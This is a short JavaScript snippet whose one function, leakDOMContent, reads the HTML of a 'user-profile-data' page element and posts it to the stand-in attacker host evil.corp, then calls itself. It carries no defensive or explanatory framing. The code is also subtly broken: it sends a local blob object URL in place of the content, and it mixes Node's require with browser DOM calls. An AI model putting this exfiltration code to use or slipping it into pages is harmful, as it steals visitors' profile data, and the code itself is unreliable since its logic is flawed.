```javascript
const axios = require('axios');

// Function to get HTML from DOM and send it to the server
async function leakDOMContent() {
    const userProfileDataElement = document.getElementById('user-profile-data');
    if (!userProfileDataElement) return;

    const htmlContent = new Blob([userProfileDataElement.innerHTML], {type: 'text/html'});
    const url = URL.createObjectURL(htmlContent);

    axios.post('https://evil.corp/leak', {
        leak: url,
    })
    .then((response) => {
        console.log(response.data);
    })
    .catch((error) => {
        console.error(error);
    });
}

// Call the function to get and send the HTML content
leakDOMContent();
```

